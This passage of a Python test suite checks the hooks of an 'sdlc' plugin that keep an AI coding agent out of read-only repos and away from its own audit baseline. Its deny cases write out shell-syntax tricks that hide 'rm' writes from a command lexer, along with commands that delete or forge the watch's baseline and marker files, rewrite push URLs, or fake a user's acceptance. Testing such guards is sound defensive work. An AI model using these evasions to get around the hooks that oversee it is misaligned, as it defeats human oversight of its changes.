        self.assertIsNotNone(self.pre("Bash", command="sh <<< 'cd specs && touch b'"))
        self.assertIsNotNone(self.pre("Bash", command="(( x\nrm specs/a.md"))
        self.assertIsNone(self.pre("Bash", command="cat <<< \"rm specs/a.md\""))
        # Windows paths reach Git Bash: a backslash before a path character is a separator, never an escape
        for command in ("rm specs\\a.md", "git -C .\\specs commit -am x"):
            self.assertIsNotNone(self.pre("Bash", command=command), command)

    def test_shell_syntax_the_lexer_cant_read_is_denied(self):
        # .sdlc/2026-11-22-s-lexer-denies-unreadable AC-001 (security review SR1-H1 of 2026-11-22-m-watch-guard-reads):
        # each line hides a write the lexer reads differently from the shell; the guard denies rather than guess
        hidden = ["echo $(( $(rm specs/a.md) + 1 ))", "echo $(( `rm specs/a.md` ))",
                  "echo a\\ #; rm specs/a.md", "echo $'\\''; rm specs/a.md", "echo x >! specs/a.md",
                  "echo x >| specs/a.md"]
        for command in hidden:
            reason = self.pre("Bash", command=command)
            self.assertIsNotNone(reason, command)
        # end-of-push review r1: SH-H1 (a `#` after an escaped delimiter or a continuation), SH-H2 (clobber after
        # `>>` / `>&`), SH-H6 (a substitution in an array subscript)
        hidden += ["echo a\\;#x; rm specs/a.md", "echo a\\|#x; rm specs/a.md", "echo a\\&#x; rm specs/a.md",
                   "echo a\\(#x; rm specs/a.md", "echo a\\\n#x; rm specs/a.md", "echo x >>! specs/a.md",
                   "echo x >>| specs/a.md", "echo x >&! specs/a.md", "echo x 2>>! specs/a.md"]
        for command in hidden:
            self.assertIsNotNone(self.pre("Bash", command=command), command)
        # plain spellings of the same things still pass (SH-M4, SH-L4: no false denies)
        for command in ("echo $(( 1 + 2 )) > out.txt", "echo 'a #b'", "echo x > out.txt", "printf '%s' x",
                        "IFS=$'\\n' read -r x", "cut -d$'\\t' -f1 f", "echo $$'x'", "echo $(( $((1+2)) * 3 ))",
                        "echo a\\\\ # a comment", "echo x 2>&1 >> out.txt", "echo x >|out.txt", "cmd >out | tee log",
                        "echo x # ; rm nothing", "[ \"$(git status --porcelain)\" ] && echo dirty"):
            self.assertIsNone(self.pre("Bash", command=command), command)

    def test_too_deep_is_denied_for_that_reason(self):
        reason = self.pre("Bash", command="echo " + "$(" * 30 + "x" + ")" * 30)
        self.assertIsNotNone(reason)
        self.assertIn("too deep", reason)
        self.assertNotIn("read-only repo", reason)


class ReadOnlyBackstop(WorkbenchFeatureCase):
    """Review round 4: whatever a command's syntax, a change in a read-only repo is reported after the call that
    made it and blocks Stop until it is undone; read-only repos can't push."""

    def setUp(self):
        super().setUp()
        import tempfile
        self.data = os.path.realpath(tempfile.mkdtemp(prefix="sdlc-data-"))
        self.addCleanup(rmtree, self.data)

    def watch(self, event, session="s1", tool="Bash", **extra):
        from helpers import run_hook
        payload = {"hook_event_name": event, "session_id": session, "cwd": self.root, **extra}
        if event in ("PreToolUse", "PostToolUse", "PostToolUseFailure"):
            payload.update(tool_name=tool, tool_input={"command": "x"}, tool_response={})
        code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "read_only_watch.py")], payload, self.root,
                                       {"CLAUDE_PLUGIN_DATA": self.data})
        self.assertEqual(code, 0, err)
        return out or {}

    def accept(self, *names):
        """The user's message `accept read-only [names]`: the only way a new baseline is taken."""
        out = self.watch("UserPromptSubmit", prompt=" ".join(("accept read-only",) + names))
        self.assertIn("accepted", out.get("systemMessage", ""), out)
        return out

    def baseline_file(self):
        [name] = [f for f in os.listdir(self.data) if f.startswith("read-only-baseline-")]
        return os.path.join(self.data, name)

    def test_an_unlisted_folder_of_a_seeded_workbench_is_reviewed(self):
        # end-of-push review R2-L3: a scratch clone in a seeded workbench isn't a member; a repo dropped from the
        # manifest (one the watch's `members` held) still is, and unsure ownership reviews it
        import sdlc_review_gate as gate
        import sdlc_scopes
        from unittest import mock
        env = mock.patch.dict(os.environ, {"CLAUDE_PLUGIN_DATA": self.data})  # the gate reads this host's own file
        env.start()
        self.addCleanup(env.stop)
        self.assertEqual(self.watch("SessionStart"), {})
        scratch = self.path("scratch")
        git(self.root, "init", "-q", "-b", "main", "scratch")
        self.write("scratch/a.py", "x = 1\n")
        git(scratch, "add", "-A")
        git(scratch, "commit", "-q", "-m", "x")
        # end review r2: telling a scratch clone from a dropped repo can be outrun, so both are reviewed
        self.assertEqual(gate._workbench_feature(scratch), (True, ""))
        self.assertFalse(gate.decide(scratch, [git_out(scratch, "rev-parse", "HEAD")], set()).get("off"))
        manifest = sdlc_scopes.read_repo_json(self.root, "workbench.json")
        self.write_json("workbench.json", {"repos": [r for r in manifest["repos"] if r["name"] != "api"]})
        self.assertEqual(gate._workbench_feature(self.path("api")), (True, ""))
        # a baseline it can't read: unsure again, so the scratch clone is reviewed
        os.remove(self.baseline_file())
        self.assertEqual(gate._workbench_feature(scratch), (True, ""))

    def test_the_gate_reads_only_its_own_baseline_and_members_only_grow(self):
        # end review of 2026-11-22-todo-lanes: SG-H2 (a repo added after the first look, then dropped), SG-M2 (the
        # marker pointing the gate at a forged baseline)
        import sdlc_review_gate as gate
        import sdlc_scopes
        from unittest import mock
        env = mock.patch.dict(os.environ, {"CLAUDE_PLUGIN_DATA": self.data})
        env.start()
        self.addCleanup(env.stop)
        self.assertEqual(self.watch("SessionStart"), {})
        manifest = sdlc_scopes.read_repo_json(self.root, "workbench.json")
        git(self.root, "init", "-q", "-b", "main", "extra")
        self.write_json("workbench.json", {"repos": manifest["repos"] + [
            {"name": "extra", "url": "u9", "role": "app", "write": True}]})
        self.watch("PostToolUse")  # the watch sees the new name
        self.write_json("workbench.json", manifest)  # then it's dropped
        self.assertEqual(gate._workbench_feature(self.path("extra")), (True, ""))
        forged = os.path.join(self.data, "elsewhere")
        os.makedirs(forged)
        fake = os.path.join(forged, "read-only-baseline-0000000000000000.json")
        with open(fake, "w", encoding="utf-8") as f:
            json.dump({"repos": {}, "members": ["other"]}, f)
        self.write(".sdlc/.work/read-only-seeded", "x\n" + fake + "\n")
        self.write_json("workbench.json", {"repos": [r for r in manifest["repos"] if r["name"] != "api"]})
        self.assertEqual(gate._workbench_feature(self.path("api")), (True, ""))  # the real baseline held api

    def test_a_write_true_round_trip_is_reported_until_accepted(self):
        # end-of-push review r2 R2-H3: from a clean first look, writable, a commit made to look pushed, read-only
        # again: still reported, until the user accepts
        import sdlc_scopes
        self.assertEqual(self.watch("SessionStart"), {})
        manifest = sdlc_scopes.read_repo_json(self.root, "workbench.json")
        specs = self.path("specs")
        self.write_json("workbench.json", {"repos": [dict(r, write=True) if r["name"] == "specs" else r
                                                     for r in manifest["repos"]]})
        self.watch("PostToolUse")
        git(specs, "commit", "-q", "--allow-empty", "-m", "sneaky")
        git(specs, "update-ref", "refs/remotes/origin/main", "HEAD")
        self.write_json("workbench.json", manifest)
        out = self.watch("Stop")
        self.assertEqual(out.get("decision"), "block", out)
        self.assertIn("specs", out["reason"])
        self.accept()
        self.assertEqual(self.watch("Stop"), {})
        # R2-L1: a damaged list in the baseline is reported, not rebuilt silently
        with open(self.baseline_file(), encoding="utf-8") as f:
            data = json.load(f)
        data["read_only"] = "specs"
        with open(self.baseline_file(), "w", encoding="utf-8") as f:
            json.dump(data, f)
        self.assertEqual(self.watch("Stop").get("decision"), "block")

    def test_control_file_round_trips_and_damage_are_still_seen(self):
        # end-of-push review r1 of 2026-11-22-todo-fixes
        import sdlc_scopes
        import sdlc_review_gate as gate
        self.write("specs/x.md", "first\n")  # dirty at the first look (SH-M1)
        self.assertEqual(self.watch("SessionStart"), {})
        manifest = sdlc_scopes.read_repo_json(self.root, "workbench.json")
        specs = self.path("specs")
        # SH-H3: writable, a local commit made to look pushed, read-only again: compared with the old baseline
        self.write_json("workbench.json", {"repos": [dict(r, write=True) if r["name"] == "specs" else r
                                                     for r in manifest["repos"]]})
        self.watch("PostToolUse")
        os.remove(self.path("specs/x.md"))
        git(specs, "add", "-A")
        git(specs, "commit", "-q", "--allow-empty", "-m", "sneaky")
        git(specs, "update-ref", "refs/remotes/origin/main", "HEAD")
        self.write_json("workbench.json", manifest)  # a clean tree at refs that look pushed
        self.assertEqual(self.watch("Stop").get("decision"), "block")
        self.accept()
        self.assertEqual(self.watch("Stop"), {})
        # SH-M1: back to a dirty first look by name, but with new bytes: reported, not taken silently
        self.write("specs/x.md", "rewritten by the agent\n")
        self.assertEqual(self.watch("PostToolUse").get("decision"), "block")
        self.accept()
        # SH-H4: a writable repo's entry removed, or the manifest deleted, is seen; membership holds for the review
        self.write_json("workbench.json", {"repos": [r for r in manifest["repos"] if r["name"] != "api"]})
        out = self.watch("PostToolUse")
        self.assertEqual(out.get("decision"), "block", out)
        self.assertIn("api", out["reason"])
        self.assertTrue(gate._workbench_feature(self.path("api"))[0])
        os.rename(self.path("workbench.json"), self.path("moved.json"))
        self.assertTrue(sdlc_scopes.guarded_workbench(self.root))
        self.assertEqual(self.watch("Stop").get("decision"), "block")
        self.assertTrue(gate._workbench_feature(self.path("api"))[0])
        os.rename(self.path("moved.json"), self.path("workbench.json"))
        self.write_json("workbench.json", manifest)
        self.accept()
        # SH-L3: a damaged `first` is reported, never a silent crash
        with open(self.baseline_file(), encoding="utf-8") as f:
            data = json.load(f)
        data["first"] = []
        with open(self.baseline_file(), "w", encoding="utf-8") as f:
            json.dump(data, f)
        self.assertEqual(self.watch("Stop").get("decision"), "block")

    def test_an_accept_names_the_dropped_repos_it_clears(self):
        # todo: `accept read-only` after `scaffold.py workbench remove specs` cleared the report but said "none found"
        import sdlc_scopes
        self.assertEqual(self.watch("SessionStart"), {})
        manifest = sdlc_scopes.read_repo_json(self.root, "workbench.json")
        note = self.accept()["systemMessage"]
        self.assertIn("as they are now: specs", note)  # taken as it is
        self.assertNotIn("stopped watching", note)
        for repos, names, gone in (([r for r in manifest["repos"] if r["name"] != "specs"], (), "specs"),  # dropped
                                   ([dict(r, write=True) if r["name"] == "specs" else r for r in manifest["repos"]],
                                    ("specs",), "specs"),  # made writable, accepted by name
                                   ([r for r in manifest["repos"] if r["name"] != "api"], ("api",), "api")):
            # (a writable repo dropped from the manifest is reported too, and named when cleared)
            self.write_json("workbench.json", {"repos": repos})
            self.assertEqual(self.watch("PostToolUse").get("decision"), "block")
            note = self.accept(*names)["systemMessage"]
            self.assertNotIn("none found", note)
            self.assertIn("stopped watching", note)
            self.assertIn(gone, note.split("stopped watching", 1)[1])
            self.assertEqual(self.watch("Stop"), {})
            # a second accept has nothing left to clear
            self.assertIn("none found", self.accept(*names)["systemMessage"])
            self.write_json("workbench.json", manifest)
            self.watch("PostToolUse")
            self.accept()

    def test_the_control_files_cannot_turn_the_watch_off(self):
        # .sdlc/2026-11-22-s-workbench-control-files (security-r7 SR7-M3)
        import sdlc_scopes
        self.assertEqual(self.watch("SessionStart"), {})
        manifest = sdlc_scopes.read_repo_json(self.root, "workbench.json")
        # AC-001: a read-only repo made writable, or dropped from the manifest, is a reported difference until accepted
        for repos in ([dict(r, write=True) if r["name"] == "specs" else r for r in manifest["repos"]],
                      [r for r in manifest["repos"] if r["name"] != "specs"]):
            self.write_json("workbench.json", {"repos": repos})
            out = self.watch("PostToolUse")
            self.assertEqual(out.get("decision"), "block", out)
            self.assertIn("made writable or removed", out["reason"])
            self.assertEqual(self.watch("Stop").get("decision"), "block")
            self.accept()
            self.assertEqual(self.watch("Stop"), {})
            self.write_json("workbench.json", manifest)
            self.watch("PostToolUse")
            self.accept()
        # AC-002: `"workbench": false` once the watch has seeded leaves the workbench guarded
        config = sdlc_scopes.read_repo_json(self.root, ".sdlc/config.json")
        self.write_json(".sdlc/config.json", dict(config, workbench=False))
        self.assertTrue(sdlc_scopes.guarded_workbench(self.root))
        from helpers import run_hook
        import sdlc_review_gate as gate
        # the write guard still denies a write into specs/
        _, out, _, _ = run_hook(["python3", os.path.join(HOOKS, "pretooluse.py")], {
            "hook_event_name": "PreToolUse", "tool_name": "Write", "cwd": self.root,
            "tool_input": {"file_path": self.path("specs/b.md"), "content": "x"}}, self.root)
        self.assertEqual((out or {}).get("hookSpecificOutput", {}).get("permissionDecision"), "deny")
        self.assertTrue(gate._workbench_feature(self.path("api"))[0])  # the app review still sees a member repo
        self.write("specs/b.md", "x")
        self.assertEqual(self.watch("PostToolUse").get("decision"), "block")
        # a host without CLAUDE_PROJECT_DIR (Codex), called from inside a repo, finds the workbench too
        code, out, _, err = run_hook(["python3", os.path.join(HOOKS, "read_only_watch.py")], {
            "hook_event_name": "Stop", "session_id": "s1", "cwd": self.path("api")}, self.path("api"),
            {"CLAUDE_PLUGIN_DATA": self.data, "CLAUDE_PROJECT_DIR": ""})
        self.assertEqual((out or {}).get("decision"), "block", (out, err))

    def test_undoing_an_accepted_change_back_to_the_first_look_is_silent(self):
        # .sdlc/2026-11-22-s-watch-undo-accepted AC-001 (3.8.0 smoke test K)
        self.assertEqual(self.watch("SessionStart"), {})
        self.write("specs/b.md", "x")
        self.assertEqual(self.watch("PostToolUse").get("decision"), "block")
        self.accept()
        self.assertEqual(self.watch("PostToolUse"), {})
        os.remove(self.path("specs/b.md"))  # back to how sdlc first saw it
        self.assertEqual(self.watch("PostToolUse"), {})
        self.assertEqual(self.watch("Stop"), {})
        self.write("specs/c.md", "y")  # a new change after that is still seen
        self.assertEqual(self.watch("PostToolUse").get("decision"), "block")

    def test_a_monitor_call_that_writes_a_read_only_repo_is_seen_at_once(self):
        # .sdlc/2026-11-22-s-monitor-other-hooks AC-002: the per-call check covers Monitor, not only the turn end
        self.assertEqual(self.watch("SessionStart"), {})
        self.write("specs/b.md", "x")
        self.assertEqual(self.watch("PostToolUse", tool="Monitor").get("decision"), "block")
        with open(os.path.join(HOOKS, "hooks.json"), encoding="utf-8") as f:
            hooks = json.load(f)["hooks"]
        for event in ("PreToolUse", "PostToolUse", "PostToolUseFailure"):
            [matcher] = [e["matcher"] for e in hooks[event] if any("read_only_watch.py" in h["command"] for h in e["hooks"])]
            self.assertIn("Monitor", matcher.split("|"), event)

    def test_any_change_in_a_read_only_repo_is_reported_and_blocks_stop(self):
        specs = self.path("specs")
        self.write("specs/mine.md", "the user's own edit, before the session")
        self.assertEqual(self.watch("SessionStart"), {})  # the first look: the baseline, before any call runs
        self.write("specs/b.md", "x")  # the first call's own change is never absorbed
        out = self.watch("PostToolUse")
        self.assertEqual(out.get("decision"), "block", out)
        self.assertIn("specs", out["reason"])
        self.assertIn("b.md", out["reason"])
        self.assertIn("accept read-only", out["reason"])
        self.assertIn("specs", out["hookSpecificOutput"]["additionalContext"])
        self.assertEqual(self.watch("PostToolUse"), {})  # said once, not after every call
        self.assertEqual(self.watch("Stop").get("decision"), "block")
        self.assertNotEqual(self.watch("Stop", stop_hook_active=True).get("decision"), "block")  # never a loop
        # A new session still sees what no one resolved
        self.assertEqual(self.watch("Stop", session="s2").get("decision"), "block")
        os.remove(self.path("specs/b.md"))
        self.assertEqual(self.watch("Stop"), {})
        # A failed call that committed is seen too
        git(specs, "add", "-A")
        git(specs, "commit", "-q", "-m", "sneaky")
        out = self.watch("PostToolUseFailure")
        self.assertEqual(out.get("decision"), "block", out)
        self.assertIn("commit", out["reason"])
        git(specs, "reset", "-q", "HEAD~1")
        self.assertEqual(self.watch("Stop"), {})
        # The push URL is part of what it holds
        git(specs, "remote", "add", "origin", "https://example.com/specs.git")
        self.assertIn("push URL", self.watch("Stop").get("reason", ""))
        git(specs, "remote", "remove", "origin")
        # Writable repos and the workbench itself are not watched
        self.write("api/new.py", "x")
        self.assertEqual(self.watch("PostToolUse"), {})
        # The user accepts a change of their own; a repo that goes missing is a change
        self.write("specs/c.md", "x")
        self.assertIn("specs", self.accept("specs")["systemMessage"])
        self.assertEqual(self.watch("UserPromptSubmit", prompt="please accept read-only specs"), {})  # exact only
        self.assertEqual(self.watch("Stop"), {})
        import shutil
        shutil.move(specs, self.path("specs-moved"))
        self.assertIn("missing", self.watch("Stop").get("reason", ""))

    def test_seen_repos_lose_their_push_url_and_new_clones_start_clean(self):
        url = self.origin("tests")
        git(self.path("specs"), "remote", "add", "origin", url)
        self.watch("PreToolUse")
        self.assertNotEqual(git_out(self.path("specs"), "remote", "get-url", "--push", "origin"), url)
        self.assertEqual(self.watch("Stop"), {})
        # A repo cloned after the first look, and changed in the same call
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True},
            {"name": "specs", "url": "u3", "role": "specs"},
            {"name": "tests", "url": url, "role": "tests"}]})
        git(self.root, "clone", "-q", url, "tests")
        self.write("tests/x.md", "x")
        out = self.watch("PostToolUse")
        self.assertEqual(out.get("decision"), "block", out)
        self.assertIn("tests/", out["reason"])
        self.assertNotEqual(git_out(self.path("tests"), "remote", "get-url", "--push", "origin"), url)

    def test_a_removed_baseline_and_a_reset_are_differences(self):
        specs = self.path("specs")
        self.watch("SessionStart")
        self.write("specs/b.md", "x")
        os.remove(self.baseline_file())  # one call that writes and hides it
        out = self.watch("PostToolUseFailure")
        self.assertEqual(out.get("decision"), "block", out)
        self.assertIn("baseline", out["reason"])
        self.assertEqual(out["hookSpecificOutput"]["hookEventName"], "PostToolUseFailure")
        self.assertEqual(self.watch("PreToolUse"), {})  # the next call never takes a new one
        self.assertEqual(self.watch("Stop").get("decision"), "block")
        # The marker gone (git clean -fdX in the workbench) is the same, and so is a damaged entry
        os.remove(self.path("specs/b.md"))
        self.accept()
        os.remove(self.path(".sdlc/.work/read-only-seeded"))
        self.watch("PreToolUse")
        self.assertIn("marker", self.watch("Stop").get("reason", ""))
        self.accept()
        with open(self.baseline_file(), "w", encoding="utf-8") as f:
            json.dump({"repos": {"specs": {}}}, f)
        self.assertIn("damaged", self.watch("Stop").get("reason", ""))
        self.accept()
        # A reset to a commit a remote already has: no file changes, no unpushed commit, still a change
        self.write("specs/c.md", "c")
        git(specs, "add", "-A")
        git(specs, "commit", "-q", "-m", "c")
        git(specs, "update-ref", "refs/remotes/origin/main", "HEAD")
        self.accept()
        git(specs, "reset", "-q", "--hard", "HEAD~1")
        self.assertIn("moved", self.watch("Stop").get("reason", ""))
        # A pull (forward to a commit a remote has) is not
        self.accept()
        git(specs, "merge", "-q", "--ff-only", "origin/main")
        self.assertEqual(self.watch("Stop"), {})

    def test_never_seeded_stop_seeds_and_the_marker_names_the_baseline(self):
        self.write("specs/b.md", "x")
        self.assertEqual(self.watch("Stop"), {})  # a host with no SessionStart: the first look of all, silent
        with open(self.path(".sdlc/.work/read-only-seeded"), encoding="utf-8") as f:
            self.assertIn(self.baseline_file(), f.read())
        # Another host on this machine without CLAUDE_PLUGIN_DATA still finds the same baseline through the marker
        from helpers import run_hook
        code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "read_only_watch.py")],
                                       {"hook_event_name": "Stop", "cwd": self.root}, self.root,
                                       {"CLAUDE_PLUGIN_DATA": "", "HOME": self.data + "-elsewhere"})
        self.assertEqual(code, 0, err)
        self.assertEqual(out or {}, {})

    def test_the_agent_cannot_accept_or_edit_the_baseline(self):
        self.watch("SessionStart")
        for command in ("rm ~/.cache/sdlc/read-only-baseline-0123.json", "rm .sdlc/.work/read-only-seeded",
                        "echo '{\"hook_event_name\": \"UserPromptSubmit\"}' | python3 hooks/read_only_watch.py",
                        "python3 -c 'import read_only_watch'", "rm -rf .sdlc/.work \"$CLAUDE_PLUGIN_DATA\"",
                        "rm -rf ~/.cache/sdlc",
                        "echo {} > \"$CLAUDE_PLUGIN_DATA/read-only-baseline-0123.json\"",
                        "git -C specs remote set-url --push origin x",
                        "git -C specs remote remove origin", "git -C specs config remote.origin.pushurl x",
                        "git -C specs update-index --assume-unchanged a.md"):
            self.assertIsNotNone(pre_hook(self, "Bash", command=command), command)
        self.assertIsNotNone(pre_hook(self, "Write", file_path=self.path(".sdlc/.work/read-only-seeded"),
                                      content="{}"))
        for command in ("git -C specs remote -v", "git -C specs config --get remote.origin.url",
                        "git -C specs config user.name"):
            self.assertIsNone(pre_hook(self, "Bash", command=command), command)

    def test_a_write_or_run_that_names_the_watch_is_still_denied(self):
        self.watch("SessionStart")
        for command in ("grep x > .sdlc/.work/read-only-seeded", "cat x | tee .sdlc/.work/read-only-seeded",
                        "find ~/.cache/sdlc -delete", "find ~/.cache/sdlc -exec rm {} +",
                        "cat $(python3 hooks/read_only_watch.py)", "git checkout -- .sdlc/.work/read-only-seeded",
                        "sed -i s/a/b/ .sdlc/.work/read-only-seeded", "bash -c \"cat read-only-seeded\"",
                        "grep x <<EOF | sh\nrm read-only-seeded\nEOF", "git -c x=y log read_only_watch",
                        "git commit -F .sdlc/.work/read-only-seeded", "unknown-tool read-only-seeded",
                        "ls ~/.cache/sdlc | xargs rm", "$(echo rm) .sdlc/.work/read-only-seeded",
                        "cat <<EOF\nplain\nEOF\nrm .sdlc/.work/read-only-seeded",
                        "git log --output=.sdlc/.work/read-only-seeded", "rg --pre sh read_only_watch",
                        "git grep -Osh read_only_watch", "sudo cat read-only-seeded"):
            self.assertIsNotNone(pre_hook(self, "Bash", command=command), command)
        self.assertIsNotNone(pre_hook(self, "PowerShell", command="Remove-Item .sdlc/.work/read-only-seeded"))
        self.assertIsNotNone(pre_hook(self, "PowerShell", command="Get-Content x | Out-File read-only-seeded"))

    def test_silent_outside_a_workbench(self):
        self.write_json(".sdlc/config.json", {})
        self.write("specs/b.md", "x")
        self.assertEqual(self.watch("PostToolUse"), {})
        self.assertEqual(self.watch("Stop"), {})

    def test_read_only_repos_cannot_push(self):
        url = self.origin("tests")
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True},
            {"name": "specs", "url": "u3", "role": "specs"},
            {"name": "tests", "url": url, "role": "tests"}]})
        code, out, err = self.run_scaffold("workbench", "clone", "tests")
        self.assertEqual(code, 0, (out, err))
        push = git_out(self.path("tests"), "remote", "get-url", "--push", "origin")
        self.assertNotEqual(push, url)
        self.assertEqual(git_out(self.path("tests"), "remote", "get-url", "origin"), url)  # pull still works
        import subprocess
        p = subprocess.run(["git", "-C", self.path("tests"), "push", "origin", "HEAD"], capture_output=True)
        self.assertNotEqual(p.returncode, 0)
        # A read-only repo the feature records gets the same
        git(self.path("specs"), "remote", "add", "origin", url)
        self.assertEqual(self.state("repo", "feat", "specs")[0], 0)
        self.assertNotEqual(git_out(self.path("specs"), "remote", "get-url", "--push", "origin"), url)


class PluginReviewWorkbench(WorkbenchFeatureCase):
    """The whole-plugin review (session sdlc-f2): H4 app-repo commits keep their security review, H5 Bash can't
    reach an app repo's recorded tests from the workbench root, W2 app commands count in Review's hooks, W3 doctor,
    W8 the baseline waiver, W9 drift, W10 clone and remove."""

    def test_app_repo_commits_are_reviewed_for_the_workbench_feature(self):
        import sdlc_review_gate as gate
        api = self.path("api")
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.write("api/a.py", "x = 1\n")
        git(api, "add", "-A")
        git(api, "commit", "-q", "-m", "x")
        sha = git_out(api, "rev-parse", "HEAD")
        d = gate.decide(api, [sha], set())
        self.assertFalse(d.get("off"), d)
        self.assertFalse(d["defer"], d)
        self.assertEqual(self.state("set", "feat", "Risk", "high")[0], 0)
        d = gate.decide(api, [sha], set())
        self.assertFalse(d.get("skip") or d.get("off") or d["defer"], d)  # Risk: high is always reviewed
        # Ship sets Status: done before the app repos commit: still reviewed while the repo is on the feature's branch
        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
        self.assertFalse(gate.decide(api, [sha], set()).get("off"))
        # .sdlc/2026-11-22-s-done-feature-owns-its-branch AC-001: a recorded PR (real or not) doesn't end it (SR7-M4)
        self.assertEqual(self.state("pr", "feat", "api", "https://example.com/api/pull/1")[0], 0)
        self.assertFalse(gate.decide(api, [sha], set()).get("off"))
        # Off the feature's branch it still owns them, PR or not, until the branch is merged (SR7-L2, SH-M3)
        git(api, "switch", "-q", "-c", "next-thing")
        self.assertFalse(gate.decide(api, [sha], set()).get("off"))

    def test_the_turn_end_review_sees_an_app_repos_uncommitted_change(self):
        # .sdlc/2026-11-22-s-stop-review-app-repos AC-001: the Stop review asks the workbench's feature, as decide does
        import sdlc_review_gate as gate
        api = self.path("api")
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.write("api/a.py", "x = 1\n")  # uncommitted
        self.assertEqual(self.state("set", "feat", "Risk", "high")[0], 0)
        self.assertTrue(gate.review_wanted(api))
        self.assertEqual(self.state("set", "feat", "Risk", "low")[0], 0)
        self.assertFalse(gate.review_wanted(api))  # low risk, no security area touched
        self.write("api/auth/login.py", "x = 1\n")  # a default sensitive area
        self.assertTrue(gate.review_wanted(api))
        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
        self.assertEqual(self.state("pr", "feat", "api", "12")[0], 0)
        git(api, "switch", "-q", "-c", "next-thing")
        self.assertTrue(gate.review_wanted(api))  # the done feature's branch isn't merged: still its change
        origin = self.path("origin-api.git")
        git(self.root, "init", "-q", "--bare", origin)
        git(api, "add", "-A")
        git(api, "commit", "-q", "-m", "x")
        git(api, "remote", "add", "origin", origin)
        git(api, "push", "-q", "origin", "next-thing:main")  # merged: feat-x's tip is in origin's main
        git(api, "fetch", "-q", "origin")
        git(api, "branch", "-f", "feat-x", "next-thing")
        self.write("api/auth/more.py", "x = 1\n")
        self.assertFalse(gate.review_wanted(api))  # nothing owns it now

    def test_a_done_feature_keeps_a_detached_repo_until_its_branch_is_merged(self):
        # .sdlc/2026-11-22-s-done-feature-detached AC-001, widened (SR7-L2): off the branch, a recorded PR or not,
        # still owned while the feature's branch isn't merged
        import sdlc_review_gate as gate
        api = self.path("api")
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
        self.assertEqual(self.state("pr", "feat", "api", "https://example.com/api/pull/1")[0], 0)
        git(api, "checkout", "-q", "--detach")
        self.write("api/a.py", "x = 1\n")
        git(api, "add", "-A")
        git(api, "commit", "-q", "-m", "x")
        sha = git_out(api, "rev-parse", "HEAD")
        self.assertFalse(gate.decide(api, [sha], set()).get("off"))

    def test_a_done_feature_owns_its_app_repo_until_its_branch_is_merged(self):
        # SR7-L2, SH-M3: neither a recorded PR nor a branch switch (state-file writes and checkouts) ends ownership;
        # the feature's branch merged into the remote's default branch does
        import sdlc_review_gate as gate
        api = self.path("api")
        origin = self.path("origin-api.git")
        git(self.root, "init", "-q", "--bare", origin)
        git(api, "remote", "add", "origin", origin)
        git(api, "push", "-q", "origin", "main")
        git(api, "fetch", "-q", "origin")

        def commit(name):
            self.write(f"api/{name}.py", "x = 1\n")
            git(api, "add", "-A")
            git(api, "commit", "-q", "-m", name)
            return git_out(api, "rev-parse", "HEAD")

        def owned(sha):
            return not gate.decide(api, [sha], set()).get("off")

        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
        # the branch still at its base is trivially in origin's main: not merged work, so still owned
        git(api, "checkout", "-q", "--detach")
        self.assertTrue(owned(commit("a")))
        git(api, "switch", "-q", "feat-x")
        work = commit("b")
        self.assertEqual(self.state("pr", "feat", "api", "https://example.com/api/pull/1")[0], 0)
        git(api, "switch", "-q", "-c", "next-thing")
        self.assertTrue(owned(commit("c")))  # a recorded PR plus a branch switch (SH-M3)
        git(api, "switch", "-q", "main")
        git(api, "merge", "-q", "--ff-only", "feat-x")
        self.assertTrue(owned(commit("d")))  # merged only locally: no remote has it
        git(api, "push", "-q", "origin", f"{work}:refs/heads/main")
        git(api, "fetch", "-q", "origin")
        self.assertFalse(owned(commit("e")))  # merged into origin's main: the feature is over here

    def test_a_merged_branch_deleted_locally_ends_ownership(self):
        # end review SG-L3 of 2026-11-22-todo-lanes: `gh pr merge --delete-branch` removes refs/heads/<branch>; its
        # last tip, from HEAD's reflog, decides. An unmerged deleted branch keeps the repo owned (fail closed)
        import sdlc_review_gate as gate
        api = self.path("api")
        origin = self.path("origin-api.git")
        git(self.root, "init", "-q", "--bare", origin)
        git(api, "remote", "add", "origin", origin)
        git(api, "push", "-q", "origin", "main")
        git(api, "fetch", "-q", "origin")

        def commit(name):
            self.write(f"api/{name}.py", "x = 1\n")
            git(api, "add", "-A")
            git(api, "commit", "-q", "-m", name)
            return git_out(api, "rev-parse", "HEAD")

        def owned(sha):
            return not gate.decide(api, [sha], set()).get("off")

        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
        work = commit("b")
        git(api, "switch", "-q", "main")
        git(api, "branch", "-q", "-D", "feat-x")
        self.assertTrue(owned(commit("c")))  # deleted, never merged: still owned
        git(api, "push", "-q", "origin", f"{work}:refs/heads/main")
        git(api, "fetch", "-q", "origin")
        git(api, "reset", "-q", "--hard", "origin/main")
        self.assertFalse(owned(commit("d")))  # its last tip is in origin's main: over


    def test_a_deleted_branch_with_unmerged_work_on_the_remote_stays_owned(self):
        # security review S-1 of 2026-11-23-s-gate-ownership-leftovers: a CI fix committed from another worktree
        # isn't in HEAD's reflog; its pushed branch on the remote still holds unmerged work, so the feature owns on
        import sdlc_review_gate as gate
        api = self.path("api")
        origin = self.path("origin-api.git")
        git(self.root, "init", "-q", "--bare", origin)
        git(api, "remote", "add", "origin", origin)
        git(api, "push", "-q", "origin", "main")
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.assertEqual(self.state("set", "feat", "Status", "done")[0], 0)
        self.write("api/b.py", "x = 1\n")
        git(api, "add", "-A")
        git(api, "commit", "-q", "-m", "b")
        work = git_out(api, "rev-parse", "HEAD")
        git(api, "push", "-q", "origin", f"{work}:refs/heads/main")
        git(api, "switch", "-q", "main")
        other = self.path("api-wt")
        git(api, "worktree", "add", "-q", other, "feat-x")
        with open(os.path.join(other, "fix.py"), "w", encoding="utf-8") as f:
            f.write("y = 2\n")
